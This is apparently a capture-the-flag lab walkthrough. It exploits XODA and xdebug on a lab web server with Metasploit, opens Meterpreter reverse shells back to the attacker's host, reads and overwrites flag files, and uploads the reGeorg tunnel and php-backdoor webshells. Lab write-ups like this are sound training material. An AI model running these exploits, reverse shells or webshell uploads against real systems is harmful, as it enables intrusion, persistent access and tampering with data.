[*] Nmap: 3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
[*] Nmap: MAC Address: 02:42:C0:C0:B6:03 (Unknown)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
msf5 > services
Services
========

host           port  proto  name   state  info
----           ----  -----  ----   -----  ----
192.192.182.3  80    tcp    http   open   Apache httpd 2.4.7 (Ubuntu)
192.192.182.3  3306  tcp    mysql  open   MySQL 5.5.47-0ubuntu0.14.04.1
```

```
msf5 > curl http://192.192.182.3
[*] exec: curl http://192.192.182.3

<head>
        <title>XODA</title>
</head>
```

```
msf5 > search XODA

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability
```

```
msf5 > use exploit/unix/webapp/xoda_file_upload
msf5 exploit(unix/webapp/xoda_file_upload) > setg RHOSTS 192.192.182.3
RHOSTS => 192.192.182.3
msf5 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.192.182.3    yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /xoda/           yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5


msf5 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
msf5 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.192.182.2:4444 
[*] Sending PHP payload (TQcSUAIl.php)
[*] Executing PHP payload (TQcSUAIl.php)
[*] Sending stage (38247 bytes) to 192.192.182.3
[*] Meterpreter session 1 opened (192.192.182.2:4444 -> 192.192.182.3:59022) at 2023-02-09 08:20:52 +0000
[!] Deleting TQcSUAIl.php

meterpreter > 
```

The target server as described below is running a vulnerable web server. You have to exploit the vulnerability and get a meterpreter session on the server.  Then, you have to perform the following tasks to complete the challenge!

Tasks:

Check the present working directory on remote (exploited) machine.

`/app/files`

```
meterpreter > pwd
/app/files
```

List the files present in present working directory of the remote machine.

`No entries exist in /app/files`

```
meterpreter > ls
No entries exist in /app/files
```

Check the present working directory on local (attacker) machine.

`/root`

```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(unix/webapp/xoda_file_upload) > pwd
[*] exec: pwd

/root
```

List the files present in present working directory of the local machine.

`README, tools, wordlists`

```
msf5 exploit(unix/webapp/xoda_file_upload) > ls -l
[*] exec: ls -l

total 12
-rw-r--r-- 1 root root  293 Feb  7  2019 README
drwxr-xr-x 1 root root 4096 May 26  2019 tools
drwxr-xr-x 2 root root 4096 Feb  7  2019 wordlists
```

Get the flag value present in /app/flag1 file.

`5c50a439f040922188a22f88cecc5277`

```
msf5 exploit(unix/webapp/xoda_file_upload) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter php/linux  www-data (33) @ victim-1  192.192.182.2:4444 -> 192.192.182.3:59022 (192.192.182.3)

msf5 exploit(unix/webapp/xoda_file_upload) > sessions 1
[*] Starting interaction with 1...

meterpreter > pwd
/app/files
meterpreter > cd ..
meterpreter > pwd
/app
meterpreter > ls
Listing: /app
=============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   4096   dir   2016-02-15 10:35:00 +0000  .git
40755/rwxr-xr-x   4096   dir   2023-02-09 08:14:40 +0000  .xoda
100777/rwxrwxrwx  10273  fil   2016-02-15 10:35:00 +0000  LICENSE
100777/rwxrwxrwx  8703   fil   2018-10-05 18:41:42 +0000  README
100777/rwxrwxrwx  79     fil   2016-02-15 10:35:00 +0000  README.md
40777/rwxrwxrwx   4096   dir   2018-10-06 06:33:10 +0000  Secret Files
100777/rwxrwxrwx  1284   fil   2018-10-05 18:41:42 +0000  config.php
40777/rwxrwxrwx   4096   dir   2023-02-09 08:20:52 +0000  files
100777/rwxrwxrwx  33     fil   2018-10-06 05:13:55 +0000  flag1
100777/rwxrwxrwx  208    fil   2018-10-06 05:19:22 +0000  flag5.zip
100777/rwxrwxrwx  40563  fil   2018-10-05 18:41:42 +0000  functions.php
100777/rwxrwxrwx  57739  fil   2018-10-05 18:41:42 +0000  index.php
40777/rwxrwxrwx   4096   dir   2018-10-05 18:41:42 +0000  js
100777/rwxrwxrwx  14598  fil   2016-02-15 10:35:00 +0000  logo.png
100777/rwxrwxrwx  5265   fil   2018-10-05 18:41:42 +0000  mobile.css
100777/rwxrwxrwx  19     fil   2016-02-15 10:35:00 +0000  phpinfo.php
100777/rwxrwxrwx  5758   fil   2018-10-05 18:41:42 +0000  style.css
40777/rwxrwxrwx   4096   dir   2018-10-05 18:41:42 +0000  xd_icons
100777/rwxrwxrwx  18850  fil   2018-10-05 18:41:42 +0000  zipstream.php
meterpreter > cat flag1
5c50a439f040922188a22f88cecc5277
```

Change the flag value present in /app/flag1, so that no one else can get the right flag.

```
meterpreter > edit flag1
meterpreter > cat flag1
The content of file flag1 has been modified, no one else can get the right flag, lol.
```

Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.

`bbbb3ed27502614e27bff65faea008a0`

```
meterpreter > cd "Secret Files"
meterpreter > pwd
/app/Secret Files
meterpreter > ls
Listing: /app/Secret Files
==========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  33    fil   2018-10-06 05:16:03 +0000  .flag2

meterpreter > cat .flag2
bbbb3ed27502614e27bff65faea008a0
```

Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.

`MD5 hash of /bin/bash`

```
meterpreter > download flag5.zip
[*] Downloading: flag5.zip -> flag5.zip
[*] Downloaded 208.00 B of 208.00 B (100.0%): flag5.zip -> flag5.zip
[*] download   : flag5.zip -> flag5.zip
meterpreter > 
Background session 1? [y/N]  
msf5 exploit(unix/webapp/xoda_file_upload) > ls
[*] exec: ls

README
flag5.zip
tools
wordlists
msf5 exploit(unix/webapp/xoda_file_upload) > unzip flag5.zip
[*] exec: unzip flag5.zip

Archive:  flag5.zip
[flag5.zip] list password: 
 extracting: list                    
msf5 exploit(unix/webapp/xoda_file_upload) > cat list
[*] exec: cat list

MD5 hash of /bin/bash
```

Delete the .zip file from the directory.

```
msf5 exploit(unix/webapp/xoda_file_upload) > sessions 1
[*] Starting interaction with 1...
meterpreter > rm flag5.zip
```

Print checksum of file mentioned in the extracted file (Refer to Q8).

[Manage Meterpreter and Shell Sessions](https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/)

`164ebd6889588da166a52ca0d57b9004`

```
Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    checksum      Retrieve the checksum of a file
    checksum      检索文件的校验和
```

```
meterpreter > checksum -h
Usage: checksum [md5 / sha1] file1 file2 file3 ...
meterpreter > checksum md5 /bin/bash
164ebd6889588da166a52ca0d57b9004  /bin/bash
```

Check the PATH environment variable on the remote machine.

[Manage Meterpreter and Shell Sessions](https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/)

`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

```
Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    getenv        Get one or more environment variable values
    getenv        获取一个或多个环境变量值
```

```
meterpreter > getenv PATH

Environment Variables
=====================

Variable  Value
--------  -----
PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.

`/usr/bin\backdoor`

```
meterpreter > search -d /usr/local/sbin -f *ckdo*
No files matching your search were found.
meterpreter > search -d /usr/local/bin -f *ckdo*
No files matching your search were found.
meterpreter > search -d /usr/sbin -f *ckdo*
No files matching your search were found.
meterpreter > search -d /usr/bin -f *ckdo*
Found 1 result...
    /usr/bin\backdoor (66 bytes)
meterpreter > search -d /sbin -f *ckdo*
No files matching your search were found.
meterpreter > search -d /bin -f *ckdo*
No files matching your search were found.
```

Change to tools directory on the local machine.

```
meterpreter > 
Background session 1? [y/N]  
msf5 exploit(unix/webapp/xoda_file_upload) > pwd
[*] exec: pwd

/root
msf5 exploit(unix/webapp/xoda_file_upload) > ls -l
[*] exec: ls -l

total 20
-rw-r--r-- 1 root root  293 Feb  7  2019 README
-rw-r--r-- 1 root root  208 Oct  6  2018 flag5.zip
-rw-r--r-- 1 root root   22 Oct  6  2018 list
drwxr-xr-x 1 root root 4096 May 26  2019 tools
drwxr-xr-x 2 root root 4096 Feb  7  2019 wordlists
msf5 exploit(unix/webapp/xoda_file_upload) > cd tools
msf5 exploit(unix/webapp/xoda_file_upload) > ls -l
[*] exec: ls -l

total 48
drwxr-xr-x 2 root root 4096 Feb  7  2019 Delorean
drwxr-xr-x 5 root root 4096 May 16  2019 GitTools
drwxr-xr-x 3 root root 4096 Feb  7  2019 JohnTheRipper
drwxr-xr-x 5 root root 4096 Apr 28  2019 exfil
drwxr-xr-x 2 root root 4096 Feb  7  2019 firepwd
drwxr-xr-x 2 root root 4096 Feb  7  2019 ircsnapshot
drwxr-xr-x 2 root root 4096 Feb  7  2019 known_hosts-hashcat
drwxr-xr-x 2 root root 4096 May 14  2019 portable
drwxr-xr-x 2 root root 4096 Feb  7  2019 reGeorg
drwxr-xr-x 3 root root 4096 Feb  7  2019 scripts
drwxr-xr-x 1 root root 4096 May 26  2019 srtp-decrypt
drwxr-xr-x 2 root root 4096 Feb  7  2019 steganography
```

Upload a PHP webshell to app directory of the remote machine.

[sensepost/reGeorg](https://github.com/sensepost/reGeorg)

```
msf5 exploit(unix/webapp/xoda_file_upload) > find /root/tools -name *.php
[*] exec: find /root/tools -name *.php

/root/tools/reGeorg/tunnel.nosocket.php
/root/tools/reGeorg/tunnel.php
msf5 exploit(unix/webapp/xoda_file_upload) > sessions 1
[*] Starting interaction with 1...

meterpreter > pwd
/app
meterpreter > upload /root/tools/reGeorg/tunnel.php
[*] uploading  : /root/tools/reGeorg/tunnel.php -> tunnel.php
[*] Uploaded -1.00 B of 5.56 KiB (-0.02%): /root/tools/reGeorg/tunnel.php -> tunnel.php
[*] uploaded   : /root/tools/reGeorg/tunnel.php -> tunnel.php
```

## Solution
The exploitaion phase is different from my solution.

```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.87.169.2  netmask 255.255.255.0  broadcast 192.87.169.255
        ether 02:42:c0:57:a9:02  txqueuelen 0  (Ethernet)
```

The target IP address: 192.87.169.3

```
root@attackdefense:~# nmap -sS -sV 192.87.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-02-09 09:51 UTC
Nmap scan report for target-1 (192.87.169.3)
Host is up (0.0000090s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
MAC Address: 02:42:C0:57:A9:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds
```

```
root@attackdefense:~# dirb http://192.87.169.3

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb  9 09:52:33 2023
URL_BASE: http://192.87.169.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.87.169.3/ ----
+ http://192.87.169.3/.git/HEAD (CODE:200|SIZE:23)                                                                                                                                        
+ http://192.87.169.3/cgi-bin/ (CODE:403|SIZE:287)                                                                                                                                        
==> DIRECTORY: http://192.87.169.3/files/                                                                                                                                                 
+ http://192.87.169.3/index.php (CODE:200|SIZE:1315)                                                                                                                                      
==> DIRECTORY: http://192.87.169.3/js/                                                                                                                                                    
+ http://192.87.169.3/LICENSE (CODE:200|SIZE:10273)                                                                                                                                       
+ http://192.87.169.3/logo (CODE:200|SIZE:14598)                                                                                                                                          
+ http://192.87.169.3/mobile (CODE:200|SIZE:5265)                                                                                                                                         
+ http://192.87.169.3/phpinfo.php (CODE:200|SIZE:88068)                                                                                                                                   
+ http://192.87.169.3/README (CODE:200|SIZE:8703)                                                                                                                                         
+ http://192.87.169.3/server-status (CODE:403|SIZE:292)                                                                                                                                   
+ http://192.87.169.3/style (CODE:200|SIZE:5758)                                                                                                                                          
                                                                                                                                                                                          
---- Entering directory: http://192.87.169.3/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                          
---- Entering directory: http://192.87.169.3/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Feb  9 09:52:41 2023
DOWNLOADED: 4612 - FOUND: 10
```

```
<h2><a name="module_xdebug">xdebug</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>xdebug support</th><th>enabled</th></tr>
<tr><td class="e">Version </td><td class="v">2.2.3 </td></tr>
<tr><td class="e">IDE Key </td><td class="v"><i>no value</i> </td></tr>
```

[xdebug Unauthenticated OS Command Execution](https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/)

Module exploits a vulnerability in the eval command present in Xdebug versions 2.5.5 and below. This allows the attacker to execute arbitrary php code as the context of the web user.

xdebug 未经身份验证的操作系统命令执行

模块利用了 Xdebug 2.5.5 及以下版本中存在的 eval 命令中的漏洞。这允许攻击者作为 web 用户的上下文执行任意 php 代码。

```
msf5 > search xdebug

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/http/xdebug_unauth_exec  2017-09-17       excellent  Yes    xdebug Unauthenticated OS Command Execution


msf5 > use exploit/unix/http/xdebug_unauth_exec
msf5 exploit(unix/http/xdebug_unauth_exec) > show options

Module options (exploit/unix/http/xdebug_unauth_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /index.php       yes       Path to target webapp
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       Callback host for accepting connections
   SRVPORT  9000             yes       Port to listen for the debugger
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/http/xdebug_unauth_exec) > set RHOSTS 192.87.169.3
RHOSTS => 192.87.169.3
msf5 exploit(unix/http/xdebug_unauth_exec) > set LHOST 192.87.169.2
LHOST => 192.87.169.2
```

```
msf5 exploit(unix/http/xdebug_unauth_exec) > exploit

[*] Started reverse TCP handler on 192.87.169.2:4444 
[*] 192.87.169.3:80 - Waiting for client response.
[*] 192.87.169.3:80 - Receiving response
[*] 192.87.169.3:80 - Shell might take upto a minute to respond.Please be patient.
[*] 192.87.169.3:80 - Sending payload of size 2026 bytes
[*] Sending stage (38247 bytes) to 192.87.169.3
[*] Meterpreter session 1 opened (192.87.169.2:4444 -> 192.87.169.3:45546) at 2023-02-09 10:10:45 +0000

meterpreter >
```

```
meterpreter > lpwd
/root
meterpreter > lls
Listing Local: /root
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  570   fil   2017-10-30 12:46:42 +0000  .bashrc
40700/rwx------   4096  dir   2023-02-09 09:52:33 +0000  .cache
40755/rwxr-xr-x   4096  dir   2023-02-09 10:05:55 +0000  .msf4
40755/rwxr-xr-x   4096  dir   2019-05-26 16:35:23 +0000  .npm
100644/rw-r--r--  148   fil   2017-10-30 12:46:42 +0000  .profile
100644/rw-r--r--  13    fil   2019-02-07 07:54:01 +0000  .vimrc
100644/rw-r--r--  165   fil   2019-05-26 16:35:28 +0000  .wget-hsts
100644/rw-r--r--  293   fil   2019-02-07 07:54:01 +0000  README
40755/rwxr-xr-x   4096  dir   2019-05-26 16:36:00 +0000  tools
40755/rwxr-xr-x   4096  dir   2019-02-07 07:54:01 +0000  wordlists
```

```
meterpreter > lpwd
/root
meterpreter > lls
Listing Local: /root
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  570   fil   2017-10-30 12:46:42 +0000  .bashrc
40700/rwx------   4096  dir   2023-02-09 09:52:33 +0000  .cache
40755/rwxr-xr-x   4096  dir   2023-02-09 10:05:55 +0000  .msf4
40755/rwxr-xr-x   4096  dir   2019-05-26 16:35:23 +0000  .npm
100644/rw-r--r--  148   fil   2017-10-30 12:46:42 +0000  .profile
100600/rw-------  863   fil   2023-02-09 10:16:50 +0000  .viminfo
100644/rw-r--r--  13    fil   2019-02-07 07:54:01 +0000  .vimrc
100644/rw-r--r--  165   fil   2019-05-26 16:35:28 +0000  .wget-hsts
100644/rw-r--r--  293   fil   2019-02-07 07:54:01 +0000  README
100644/rw-r--r--  208   fil   2018-10-06 05:19:22 +0000  flag5.zip
100644/rw-r--r--  22    fil   2018-10-06 05:17:21 +0000  list
40755/rwxr-xr-x   4096  dir   2019-05-26 16:36:00 +0000  tools
40755/rwxr-xr-x   4096  dir   2019-02-07 07:54:01 +0000  wordlists

meterpreter > lcd tools
meterpreter > lpwd
/root/tools
```

```
meterpreter > pwd
/app
meterpreter > upload /usr/share/webshells/php/php-backdoor.php
[*] uploading  : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
[*] Uploaded -1.00 B of 2.73 KiB (-0.04%): /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
[*] uploaded   : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
```

The remained steps are same.
